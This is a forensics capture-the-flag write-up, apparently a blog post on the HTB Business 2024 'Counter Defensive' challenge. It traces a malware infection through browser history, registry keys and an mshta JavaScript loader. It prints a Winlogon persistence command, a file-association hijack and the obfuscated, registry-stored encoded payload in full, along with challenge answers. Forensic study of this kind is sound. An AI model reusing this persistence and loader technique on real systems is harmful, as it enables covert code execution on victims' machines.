---
layout: post
title:  "HTB Business 2024 - Counter Defensive"
category: HTB
---
{% include htb_ctf.html category="forensics" title="Counter Defensive" difficulty="Hard" scenario="As your crew prepares to infiltrate the vault, a critical discovery is made: an opposing faction has embedded malware within a workstation in your infrastructure, targeting invaluable strategic plans. Your task is to dissect the compromised system, trace the malware's operational blueprint, and uncover the method of these remote attacks. Reveal how the enemy monitors and controls their malicious software. Understanding their tactics is key to securing your plans and ensuring the success of your mission to the vault. To get the flag, spawn the docker instance and answer the questions!" %}

# Discussion
There are some points of information that we can pull from the scenario, that can assist us in our further analysis.
- This lab includes malware
- We need to figure out how it was added
- Determine how the attacker controls the software

# Answering the tasks
First, we need to grab the `counter_defensive.zip` file, and unzip it, it contains another file named `evidence.ad1` - this is a [FTK Imager]() image.

This write-up was formalized during the CTF, and priorities were not on "the right way" - many roads lead to Hell, and mine is paved with weird invocations.

Another important thing to note, is that I don't add **all** the steps I did before figuring out the solution. Sometimes a lot of time is spent on goosechases or rabbitholes - I learn from it, but there is not much value for you as a reader to go through that process (or perhaps there is). Nobody wants to see me run `strings` and `grep` a thousand times!

### [1/10] What time did the victim finish downloading the Black-Myth-Wukong64bit.exe file?
We'll start by opening up the image with FTK Imager. Personally I like to dump the data from the image, instead of mounting the image as a drive - either approach has its pros and cons. Mounting the image may cause issues due to long path names, which for some tools will be reported as corruption.

![FTK Imager](/img/htb/challenges/counter-defensive/ftk_imager_1.png)

Once we have the export, we need to determine how the file was downloaded, and/if the file is still present on the system.

Let's just search for that filename in the exported output.

{% highlight powershell %}
gci -Recurse * -Force |sls wukong | Select Path,LineNumber,Line

Path                                                                                                                            LineNumber Line
----                                                                                                                            ---------- ----
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\NTUSER.DAT                                                                  2688 edAppUserModelId����nk ��K�7��E��������...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\NTUSER.DAT                                                                  2846 ␦,�!�PC��sg���<M1SPS�jc(=�����O��-1SPS5~�w�

:\Users\User\Desktop\counter_defensive\root\Users\IEUser\NTUSER.DAT                                                                  2847 ���������R
@|�����* �...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Favicons         203 �https://www.ms8aik.com/?lang=vi-VN&token=9HS1uIXm35KzJBee3WjK...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Favicons         204 {https://taimienphi.vn/download-black-myth-wu-kong-90489�e
�K...
        C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Favicons         205 c    https://www.youtube.com/watch?v=AlU0OW7wjpQL    �       ttps://www                                                                                                                                                                                                         w.y...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Favicons         208 �    k�+�J`���kG�����(XU�...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Favicons         209 �d�Khttps://www.google.com/search?q=wukong+black+myth+pc+crack+do...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Favicons         212 U�-https://www.youtube.com/results?search_query=wukong+black+myth...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History           87 ��...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History           88 ��...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History           90 ��...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History           97 =722602bca-3267-46f9-b02f-29195a6531faC:\Users\IEUser\Desktop\Black...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History           99  https://www.mediafire.com/file/6g06ggifplxkwyz/Black-Myth-Wu...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          100 ��...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          274 �https://www.ms8aik.com/home?lang=vi-VN&token=9HS1uIXm35KzJBee3W...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          275 3https://google.com/
U�-https://www.youtube.com/results?search...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          276 L�ttps://www.youtube.com/results?search_query=wukong+black+myth...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          284    https://otnolatrnup.com/fp.rb?id=5ff0fb62-0643-4ff1-aaee-c737f9...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          285 �c�https://download.vn/black-myth-wu-kong-moi-dieu-dieu-ban-c...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          286      m�%   https://download.com.vn/black-myth-wukong-165910Black Myt...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          28https://www.google.com/Google/t�//���
        �-g   https://w...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History          288      c�    https://www.youtube.com/watch?v=AlU0OW7wjpQ19 Minutes of B...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Shortcuts         12      364183c1-c77f-47ac-8f8f-328f85b58065https://www.mediafire.com/fil...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\ConnectedDevicesPlatform\L.IEUser\ActivitiesCache.db           239 #\0���>�+%&'���hostfH��U�y,!q#\0���>�+%&'���x_exe_pathc:\users...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\ConnectedDevicesPlatform\L.IEUser\ActivitiesCache.db           532 #\0���>�+%&'���hostfH��U�y,!q#\0���>�+%&'���x_exe_pathc:\users...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\ConnectedDevicesPlatform\L.IEUser\ActivitiesCache.db           581#\0���>�+%&'���[{"application":"C:\\Users\\IEUser\\Desktop\\Blac...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\ConnectedDevicesPlatform\L.IEUser\ActivitiesCache.db           674 *Ro!,c:\users\ieuser\desktop\ftk imager\ftk imager.exex_exe_pat...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\ConnectedDevicesPlatform\L.IEUser\ActivitiesCache.db...        129 #\0���>�+%&'���hostfH��U�y,!q#\0���>�+%&'���x_exe_pathc:\users...
C:\Users\User\Desktop\counter_defensive\root\Users\IEUser\AppData\Local\ConnectedDevicesPlatform\L.IEUser\ActivitiesCache.db...        125 #\0���>�+%&'���hostfH��U�y,!q#\0���>�+%&'���x_exe_pathc:\users...

{% endhighlight %}

The output here is limited intentionally, hopefully for readability. But `ActivitiesCache.db`, `History` and `NTUSER.DAT` all references the file at `C:\Users\IEUser\Desktop\Black-Myth-Wukong64bit.exe`, but checking the directory in the output shows it's no longer present.

One interesting artifact, which may be worth investigating is the `Brave Browser`, so let's open up the history file with `SQLite Browser`. Then navigate to the `Downloads` table where we'll find the `end_time` for the download, this is partly our flag: `13357924726570750`.

![SQLite Browser](/img/htb/challenges/counter-defensive/sqlite_browser_1.png)

This is a webkit timestamp, which needs to be converted - this can be done with [Epoch Converter](https://www.epochconverter.com/webkit):

![Epoch Converter](/img/htb/challenges/counter-defensive/webkit_epoch.png)

{% include htb_flag.html id="1" description="What time did the victim finish downloading the Black-Myth-Wukong64bit.exe file?" flag="1713451126" %}

### [2/10] What is the full malicious command which is run whenever the user logs in?

We need to find a malicious command that runs everytime the user logs on, and since the `.ad1`-file only contains the user directory, we can limit our searching to the artifacts which are present within the user directories.

Let's check the `NTUSER.DAT` registry hive with `Registry Explorer`. There are multiple keys in the HKCU hive, such as `Run` and `RunOnce` but no significant data here:
![Registry Explorer](/img/htb/challenges/counter-defensive/registry_explorer_run_1.png)

If we then check the `Winlogon` key, we find a suspicious command that is run upon the initialization of `explorer.exe`

![Registry Explorer](/img/htb/challenges/counter-defensive/registry_explorer_run_2.png)

{% include htb_flag.html id="2" description="What is the full malicious command which is run whenever the user logs in?" flag="%PWS% -nop -w h \"start \"$env:temp\wct98BG.tmp\"\"" %}

### [3/10] Referring to the previous file, 'wct98BG.tmp', what is the first process that starts when the malicious file is opened?

This one was a super time consuming one for me, as I focused too much on the `.tmp` file itself, rather the context of the file. My assumptions was the `.tmp` was a binary of sorts that would be executed once the user logged on. However that was not the case, looking at it with `Detect it Easy`, the file had quite high entropy, meaning that either it was obfuscated or just random junk data. It was the latter. I spent a significant time trying to see if I could OSINT the `Black-Myth-Wukong64bit.exe` binary, so it could be executed and investigated dynamically. I also looked at all artifacts that I could think of which was available, that would contain the process that was executed. 

Going back and forth with my team, we thought about how the "binary" could be executed (still assuming it was an actual binary) - and the working theory that perhaps the environment variable `%PWS%` (which translated to `powershell`) was tampered with so that it would decrypt the `.tmp` binary.
This wasn't the case either, but it trigged another conversation about hijacking which process will be executed when opening a file with explorer.

So let's check the `.tmp` file extension `OpenWithProgids` value

![Registry Explorer](/img/htb/challenges/counter-defensive/registry_explorer_run_3.png)

At first glance, `AppXoiy6rzzu62tdihr9rgvofad4hz7tpf4m` looks like an AppX name, but if we search for it in the registries we have (`NTUSER.DAT` and `UsrClass.dat`):

![Registry Explorer](/img/htb/challenges/counter-defensive/registry_explorer_run_4.png)

Bingo, some obfuscated code. This was what we were looking for.

{% include htb_flag.html id="4" description="Referring to the previous file, 'wct98BG.tmp', what is the first process that starts when the malicious file is opened?" flag="mshta.exe" %}

### [4/10] What is the value of the variable named cRkDgAkkUElXsDMMNfwvB3 that you get after decoding the first payload?

Copying out the payload from registry, and adding some newlines leaves us with:

{% highlight js %}
"C:\Windows\system32\mshta.exe" "javascript:LQ1K5zw="";
a1iNBf="9nyGCOq9";
Th97=new ActiveXObject("WScript.Shell");
Bff9D="B";
alB4E=Th97.RegRead("HKCU\\software\\Classes\\Directory\\DisplayName");
Uv42jf="H";
for(eXbWF7Uy=alB4E.length-1;
eXbWF7Uy>=0;
eXbWF7Uy-=1)LQ1K5zw+=(alB4E.substr(eXbWF7Uy,1));
NS1M5by="";
for(MR1L5ax=0;
MR1L5ax<alB4E.length;
MR1L5ax+=2)NS1M5by+=String.fromCharCode(parseInt(LQ1K5zw.substr(MR1L5ax,2),16));
eval(NS1M5by);
hsI4L="T";
"
{% endhighlight %}

The eval function refers the variable `NS1M5by`, this is what we are looking for to get a bit further. Most of the scripts in these payloads refer to data inside registry, which will be written in code examples as strings. The more "clean" JS scripts are then executed in the Chrome console.

{% highlight js %}
LQ1K5zw="";
alB4E="b322568756e24616075647f6e622d3b64483a4d62494d60396c4c4f4a7c48567878684b3225427f4565347c6c6552395a473b4161585578474a55777a567b435a4d62454173663433363735395f6f413d4169722d3e4b47695879447e4a666f6e6b457a705530375b32225e4772783a564636734a764a70514432622d37484d637d4a7a4a48643e67777056636260776857605d4b3222795236516347776b6a4559544a6a44453f69324247584b4a7477723b622d344143753b4e663d6a74675e476445566f6b466b32276335353871333944344f4874733b496a4179326f47483f4263422d33324677766e4d4d4443785c65455b6b6147644b62536b3224745158646b6c44585c696d6445324a516b4676567a7c6a43687130396b622d364953553563717f617f484947466057735d4c6a427b322268705d654d48444a6c4550324a696a5565536a6459445f63423d40367837622d34756d665858346c6f4e6742555445513665495d616b3220397d607a795169376d47697365455851555a664c6355584a6a5a40783173756d4f422d3252797735723a5641687549687c45667b45696568655b392054417c4639416d4270744b482c6166756b322a52743b6839305e64735a5d63757345533335593f477676766150325f422d3c444a766e437440787a54617b6e457341444b4a44354f6b322e41503d6440766439336777326341405a58334452376868444746435e654a58646f463243614267465242557e622d39505a793074746e41496643614633526079647864574c6c6a5b3220344b41456831794551654371793c6052605b4936747141476a53794e4f6747685059322d38435f4c6d6a5d49534070586b44577245364149425b32214550526f473864796e483453776174613d6a72595f6344397c422d3d4b4e687954394141524c4d46636059516345376b32247c6666756e4776437f68617279667351547e457346735b6a7d62522d36794d687346375176664a755875754a4a74594164434d465d7b303a313b236b60703e4370554a5056536d646f39213d2864776e656c6e2f6035415a5a6371494c6c336b60703e4370554a5056536d64682d336b60703e4370554a5056536d646b392928247145646f63427168636e29213c236b60703e4370554a5056536d64682274737265737e2f6035415a5a6371494c6e5928247145646f63427168636e29213c2656795078327a6e4247396168747d6654782274737265737e22757536413c474825646f63427168634d6f62766e276e696274735d3b2054417c4639416d4270744b4b792b2b2656795078327a6e4247396168747d66547b3864776e656c6e22757536413c474c3656795078327a6e4247396168747d66547b303d3656795078327a6e4247396168747d66547d336b60703e4370554a5056536d6468227f666b32222d3054417c4639416d4270744b4b39222a695e6f6c5c5e65607f6c5c5c6c6568635c5c5d64366074773a78643461666f6677627932786964647236357a7a727639796f685070714c5c53756373716c634c5c5562716774766f637c5c55534b484228246165625765625e2b496a6d3f6035415a5a6371494c6b322f6035415a5a6371494c622d335843773553584668686b39222c6c6568635e2470796273635752282473656a626f485566796473614027756e6d3b496a6b3226755e4174614f62327937587963495059435873785765667938484e422d3259516550347264566541356c64426f66497a794b322f42437e69786937426872665f4c62454b6f66393843622d3a6a66577a427278385c684a61697a616b63787a4f414b322a5833503b466135316472366a717e4d466a4c61636372563951654e465536387375722d377841475a5d47645666754c6376763752426374686b3221766333575565384f4c42713d466f6c4f4d464870524735715353667f66395a6d6249315d423059536b43726b6679722d3f405a476631417444654b4846554c4560754178647b32276a7b43464e6630507639475d43577956315642664b403a4c41527643737c684a5568796647645448723172622d34563665797e6374476643486e673a5566644e495b3225403f435964674a7167484b435661427f62563372403968322d3f415c6863765773796a577c6942317c4a5976474b392926313c29223c2662473d4449654c682274737265737e2a4638387848247e6945637271607825646f63427168634d6f62766e276e696274735d3b22757536413c4749223d3b2662473d4449654c6b3864776e656c6e2a463838784c3662473d4449654c6b303d3662473d4449654c68227f666b32222d32757536413c474b322d643a557277525656324572593f4d6e60717d466e6a573b63483774695a666d427d65546d48433153324474615e622d37575556315057444a63587a4d6d465e64757d4645685b322f68675a62757a44554f4534657746393057775550763860557244486332683c655535495972395c62336033722d39463a55627649347f455d694846516d494668657b424b322864627766735a4a505f434c496972645547617b434a55525c4170527c4a43596e6838314459522d3b47776e4879476375494561387158645c485b4b32266739373666336234613165326237313933313132613430393537323562353130313362303331653835356731363135326439343663356134633463353038353561366137303031393431633633346039343162326135603266383235313631336233323533336239313165373338323831316533613035373033313131346034613162353232333330316231633560373338313032303033323162303035333433346236353230356334603430373130313361366337333633333336313731316239333031353132333660343036353366343037343333366533673537323132323237393235353563336332633165353432343567363430363937393531633560383034603337333235323630333334603363353236303132303338333032366035633231356031603465353133333732343035343831326339313932323238333232336738303833363732603261323032353531353132323462356031323132346133353336303337333236373230323663383032303830313739343661373232313662326736633735363735343631366135653360343231613330303536323363356238303332346137313235346234303230346536313630313137323463346138323165353232333833346133323667363539353660373331613032313132363332316032323265323133323632366132603335326333633562383032313663373136603331393037313135346238313433363035313631333333603732373233623430316332603733346033333263323232303360346732623930313239363460333332603360313035603132333533673261343136373660326134313632316232323163303233603233323032653461373334613333303536603260303233353336333332373663313335323667353339353031346738343262323238323560313034323360343337333260326530363831356336323360323331633663383032603231343231633232383231653530336233603162336535333930383030333730316032623530373533633163323231303632366235613033356035323530356135323565326236343361363036353633383235333330393332623263383732333262313232603335343031313130383335323133313534323232356133333737303234373231346034323830313338333531343731313262356130363461316135323464323135613532313035353232326336373361363330313932366139333832303233303335373337303333383335613563373231633233366330333935326035623461373535323663323236633432366235613033356030363567343237333334343239313732336137303233333137323730323532623332353336333262366738373233363033613131346532603233363038313260363030333367346034623931373230323663393233333331303338333032363239323262356138303030336230323260303137363232303136673932336033313332353331603463383334303932346232353231353034323662316131633332356130333730333337333530333234633163323231303632366238333033303235633637316135323130323133633560383137373260323134323162323231633232313233353563316736323533383231313736326331603463326332613460313035303337346033623636333333333230363538323830346332623033346030363663356132323235303230323032313035353233326233633132363230313367393335323363363731623533333030303736373333603162336231333132346136303737353233623266333232633832303139353632336232623234356033323432303233603265363034613561356133373830383336373730326134313637366032613431363732603261323032303033336337313333303231623232363435603737343232633130373230323733353333633930333230333161346036633561356136603230343239313632316138373932353132613367323235313567343734323731373334313830373332313363336232323832353035323560313432623367333234623230373339333833316233323660333735313032366039333033356033603465346037333460363036343633303133633367323238333467383139323263303233603830343034613636336235603433303238303163316133323736333330333663333232603263323232303260353732623033366037333560316733603134363037323660336233303433303230303730373333323161326137323432313034373135363334653560313035323832326331323132346136313336383031333236373230323467363333323660326238333161373236323637316037323534356035603561313033373233326234633132363233313263336038303663356736613232336234303560383336323337303232613732363432623737303232373663333232603833346233333930333238323263313233633531373232323935333233323461303133673933326232633837383139323432346735323663363336613232326239353230373234603337383335333930373134333337346031623130333231603567363532313461366239343931393031323531303332603534363133323532336034363632353137323661363232313567383738313932343233603232333038313636336235603463363035323232356132633336383035373530373236603667326133633132356336623561373235323362303237323664313133333032323030363632323139313661393332623132343732333163383336323632346234303630336233323233333230353432366138323730326037333336333330333633373033633661373336623433303235323362356034603465356734603830336536673932323136673661393230313632336032333031363332613733326233603736323034323433313032613460313037323037323235623262333338303032373038353160346732633732343139323832356034323230326237323361316537303633303134623660323235313933383733353231366333673232356232313833383234603262303335333930363432353165303235323631346032603933366033623132356236623561363235323567326737333235343233623561366130373233333231303260316035323361326134323732393136603733333332633931343038303637336535333233316133323464363235373231346034323830313338333531343731313262356130363461316135323464323135613532313035353232326336373361363330313932366139333832303233303335373337303333383335613563373231633233366330333935326035623461373535323663323236633432366235613033356030363567343237333334343239313732336137303233333137323730323532623332353336333262366738373233363033613131346532603233363038313260363030333367346034623931373230323663393233333331303338333032363239323262326731323364356131333560346037363633353133633260336035313263336032333163313233613433343334633333336232603162316032353232336133353465303232673531356133603637313231313032346235613033346033633637356137333034363737333460316139353830336331673467346032313460353231353832346233673035353334323263323034323437373233353663323031303736303335303733343533323032363339353361363031303433373236313460353232323534336234603560333135653360353131323163383132633163326134333832383039323433356333623333343038303162356132613232313437353336333336333636363533323363303038333331303034603633373135633033303334323334333234613561356132673233373136333563393337313833356339333731366735633933313031313432373331323363316133603132356135303737323235323833336234603633353333623632323333333263313134323131356031603667363737333032363033673035356334323132363335313132383732333163303233613633363031653333366533323832336539303732373432353237333332333530373533333462323531303830333032623160313233633930313033603935363731613460346037373232326233323661323538323332383733603331393333303633346332313531336335313160366239303363323234333137366334313131323334633661346230303160363733643432356132633630303331323230363034613930346230363233313236673532393332623667373132333163373338313260363030303033336234603467383335333930373130333366303334623461363539333332373033633361356337333262356135613531343233603935393037343830316133373533303134323162323232633667343733603832393335623360343034613236336335323362333231353233346131613336333332373636373338303833353239353930323336313930373237323531313031603165346037333460316138373933373232633360323333313633313233353431366334303260353330303631336234613133366235333432363132623565383039323433346033333663373136633332343735313433313233633333313135323534323030333660363037303335353236673132363338323731383732333163366334303260353330303032336334613563313135333133336130333737323236373530333234603567323530303930316233643432353232633130356134333364366233333231366132303633326236673330393334313261366032323531353232613360363032303566316332603737366336603363356133323737346034333636333335323032316333633432333732313160356037323332316032323265333734603561343035343831326333323367333532633363356232333031323239323232326235303363346532603162356132613232343032653630303336623663363535323933336031313632333332623263303236633332303234333134356037323232326531343933373137333563393337313533356339333731366735633933313032313432373331323333316133603132356133323736326032633663333339333633303033623660333730333032393031623362313034323330363033323930323131353632326336323467353233633663366138313563353336323932346233603363353035323467336238313532343430333464363233373363333233323832383031303732346733633732316031323531303331323464343233333560346039353260333136373830353333633132366138313563366335623830346333313433353134603733316031333133316138323564333231333033346130333833303038323930316231613930356033323432303237333464363136343461343035343831326335323932353232623667356232323463313231623260356336303131383339303637383338313232323031303465373236623930356033333132343132313660346333633134346132363432303234333134363034613460333531653261343136373731326134313637366132613431363739323261323032353461353132323467366238313460383434333564336032673461356133603637313231313032346235613033346030323362303233323030373738313131323031653135303234623367303532623163313233603231366733303035303338313363336331603363336236333033323234323337316336303732353532323533303036633461373136633433373134313333383735323664323030323930356038373733383236303330313536323032316232333332353232603632353031633130343032313133323031333332366133333165326038303733373235323132363239353132343733323134363231623567356134633464373330323231343035343831326333323932323234633132383133353263336335623830343035303032363134603562366236603233383036303737353233623630363533323363303032313631346034613033383035633667356134633464393033623561303133673933383233633330333533313530326032353263336335623831363335303631363034613033303231333560323431313366366032373032336336603467303133333332313731603262323238323433313138303664343333623232326531343933373132673563393337313833356339333731363335633660356234303033336233603332323038313260383433323036326039323032303336603167363333323660333234643561373231363531313134333364333330323660353037363335323139333660323532313663366131603463366730303632346233653363336233603832373231353160363033623366383037303636373337323367313332313160343335613032356131623567356034603664326233333631366131353533323134323563353331633032383133353231393336603235343032613530343032603537323031623232363439303737323239323636333332633933313334623661336236623561313135323231346132603565373730323260326530363831356336633831326135313432316238303231333236613633356337303461393335323362366336603260313433623835353232313663313230323667346233633661353333333134303134323432313134333167363730323160366530363831356338333467326033313933313236323531366333303235353031633236336339303737326332613732313037333564346039323433346132603161366033323632323337333831383033363230313034323230336237333561323034363360343239373232353339323332366133353331313033673633356337303461373233323031303535323360363035603165316036303636373333603032313233333361346334613134363230363530313132603364393036613830366530363933303136333261323538323332333034603463326332613632333031313263336532313632313132613532346130333737353232373561333233323032333533633361383233333263303234303567356031603234326231613732356237303233343130323660393338323633393233353331366736603933323032313931343032603137326331633930383034333730303335623461383035323263353333623132356335313034313137333631316737333935373339313461316333303831353133323837343331323367383039323263383734673633356337303461373233323031353033603260373033353336333333603636346134633530313238323132356236623561353239333567336132323630313139313031333537363261353134323563353331633167343139323263336335623260356330303033363034323233326331623260343438323730303335623130313333333667353233633661346337333831383031363032356034323360316030323561313031343532326233323932363338323163326036333532353332613633363335613363373236323333366236603260366132653337346035333663316031603260363538333032343735313561373231363930356134333136353037333032303034363360303136323437343334633367326133603532363738313532363030303432326333603637336236323332326034333337346037373931313234603332373030303930353730333433356039363362333231603565343330323660333136673532316335333261363235313167373034323531333239323160326231653561383234603467316038303133316131313036323233373561333233323363323236633732366235613160373233633531313132603637313139313032316138373933326231603532353335633267343032613832323237303460326235653663383234323362333231353233373030333367316037373931373538333163383033323132343333333262303231633131326732633034373733323561316533673933343132613660323235313532326133603031363234373433326238353130323033313467336338303133316132353367346032333263336333333837366038323432343734613561363233633663323232323430316033333560346037363360333132633360383033633267366132323163323231323335383232613033383233323162336535333233336337353736373238323130373235323833343138333260356232623033366032633130356134333636323737333160303030363233313236333162393232633837363238303363353331623233366339303130383233323137333237323132313433623336333333333931363534633263303033333661326038343732316031633531303331323534303233333032343037303633326232303837383133633163366132323463383331633831316235613530336233603033366235333233383030333730336337373931373532603263353333633131313331343632373135323737356134333530393033623132356330373232353135323261336030313632343734333463336732613360333332353630353135613662323032613532343030333736313336323732323333333667366035303361363231313032363238333460313137333234333333623260366130373830333139333132363235313532383736333531323239333533313032303561336235603133333231633360313434333935316032673236336236323467313338323360313333333262303230363131343234603230326237333930346033363235326232633360323230313667393233603331333235333160326236653560373234603262303335333930363435303037336039323231373332323633373533623660363330333033336139333433316133323034353137333660346039353261323136373162326035313432356339333163366331623831343037303636383335613260353031633233333038323336346036313130336333333730363532313260363332623033346035323262356037323364333733333560353035353335383237323261336032313933373136333731363731323233393232303530363032603433336338303133316133323736333336333531393034633263323238333830313332623033346037323332356035323165363034613632333134363932353133323730323534313663303035323431343233603233343037303636336235603037356031623232356132633336383035373160303334603432323238333830326238343930393034363531303331323430356033333560383132673831356336323563323332623263326033603532316335623261363030303736353039303537326332613460313039303367346032633530333231603933393233323031313331613930353232633630303233603534353037323160333030363232316330323330363338323332373032353331323239333533316235613530336235603433346035333833323431313337333235373663373236323267313338323930336334643433356036633362333334603235333736343632316130363235383231633261366032623837346739333163313235623232326235303736363134603262336330353133393131613337316035623931383035323467373533623660333234643561373231363531313134333364333330323660303135353932326330323562336033313663373039323531326134373632313334653833326336613463366335323360383034333935346037333166363538333667366036303431313339343432356130363930313132603136333332323431383536303632326338373632323331633833323236323263303230303933346332653263313036313437366330353163343035303565326337313530383036323937333531653661313335313433356136323930343233603337323737333032356534363632373231633467363332623667333039333431326139333732336234303931373335613460366335323360303430323366326034333461366035323667316333323660346734333733313232633433346135323265323130333561356136353232316333323661393338323332373032353032393732323533366336613663383233323433333231353160366131613336383334623461336330333630363538333032326232633262346139323332326733603530353033623132333133673160346331673661393330313633326132353832333233303460326236613130383233323563353031353463333133353037373230373130346133603663323231303432366235613032393036633530303233603334326233333032303037303633353132323933353232623663373033603463373338303632346232353231353134613662316136323233313031603935353231633631333233323637363331303432366231603733356130323531373232323464323033333560333536673533343134323563353232623663326132353262316338303533356330303736353031603330326332613732346130333366303339323131336336633163363236633361366239343931393031323531303331323534336234603560393036353232346336633562353233633733346734603231373235323135356339303332363039303363336236333033383034323337316338323732353532323833363236633830303233333262346139313930326739333165303237323561356234373632353238333261316032313163363232333163313233613660353037303636323035323162356132613232313038333165326034303732333234603163373038323930316236313930356033323432303333603364333237333830343037363035303233303532313532633363356238313031366738373335346233603560383332603332303231333560303431313366366032633032336336603667303133333332333331603262323231623433313138303464343331613460353035353232316338323360323532623637383035333832343235633533336232613433363131603162356132613232323033623730336333623160333335323832316238333332336331603262323237323433373237323165303334613460303131643632373236323163323331633132316336323732313231633831346233313231353134323162383232603233353032623736366035333032336336603733303135303360326235603032366035633160313033603036333237333830343032673533336331323431363334633832343032333731383335633933313033313432313035603262356031323933383435313630326038323166333234603933393233323031313732623262353239323131316737333935393038313260336532303460323133323932363338323163326036333532366738373633363034613531393334613562353036603360383034333630336337333230336333333030363538333732383232623034373235363930383739333231366633313162333030343531323232673267343032303562366033603561346332603265346536333332346132323233373034603262316231643335373032623132303131633263363033623266346030333033373131313467333733333235393234613032353031353660343331363933393134313261363139343135373338323830353436353567346436623533333132613430333531643461303430363032373133603362336039313531363631353730316235333162373231303734356232303162366233613235393433633561393431643636366634603461316235323233393436613732363035333732316335333164393536313735336038323133326231333162353132303133373238333335333335333932343734653460343337323667333432303464313437363232353334313533343232313431346336373834373532653636323432663437393533353534393534603036336034333363393032313633313136613567363634633730363232313460343035303034333733313730356532643030326234303232343237323232326132333161383039303135343233623363333033373360326436653662346339303434383232623661326035603032316133323332383238313260346231613737383737323134353036643636356233373835373234323463323232333367316236313231333035323932313532333663356336613531346332613932343434303267346536333162373533623933323035323032363634343032353030363262326230323235333036613032336137373333363332613163343032343631313031313031333034633165353431303633366336623137346233353361343133623835393538313430336336653261303332353337313132643563336739313460313734333536393036313637346034673630366334633533366033353237366139313561363735313231366338323732393530333660356033313663353335623434393136333263346333313437313435653433313031343431353133363033303139323664313133313737336230363335373237373432326333313932343736303634346339373432323036323132316131623533333131603730343334303535383238333432323232643237356236303633383239343231313333303430363033613336316235613630393031373261322d3a463838784b3229765156335157626875605e6a73324546405e48766371337c473e436038437c4b47664b624149664d6a722d3158794a56555f65587d4d6a6443653e65416b322c41577541467144687e4652747664484038737251385e4a7c45743d464e65533454516a6a72573747322d32744a646654455d46496434684946516459605e4b67486b32214071597a4868634747633d69333d6271487b675640335934614441614e48735b617f6377524d4730522d307c4957757943463c487270345f42655a774c6d6"
for(eXbWF7Uy=alB4E.length-1;
eXbWF7Uy>=0;
eXbWF7Uy-=1)LQ1K5zw+=(alB4E.substr(eXbWF7Uy,1));
NS1M5by="";
for(MR1L5ax=0;
MR1L5ax<alB4E.length;
MR1L5ax+=2)NS1M5by+=String.fromCharCode(parseInt(LQ1K5zw.substr(MR1L5ax,2),16));
console.log(NS1M5by);
{% endhighlight %}

The output of `NS1M5by` contains the following output (with some newlines added):

{% highlight js %} 
mlGzUbOT0rxL6CIuwYLp="P7MBWsoqkSxNAaDAd9S0FWkxArm39m3gGChhJyQpA";
hGkNPiTaVIHd4iFMUDVdjDr="7G7RzjaTT3UnFM4uLzNX1Rsx0HDftrVNxdAvAEwQL";
aEn5cDjmMxUoUVZIxQ="zmFiABkFgKLsH0cN7Ls1sfxNPFEB3znPexbgQS6QVy";
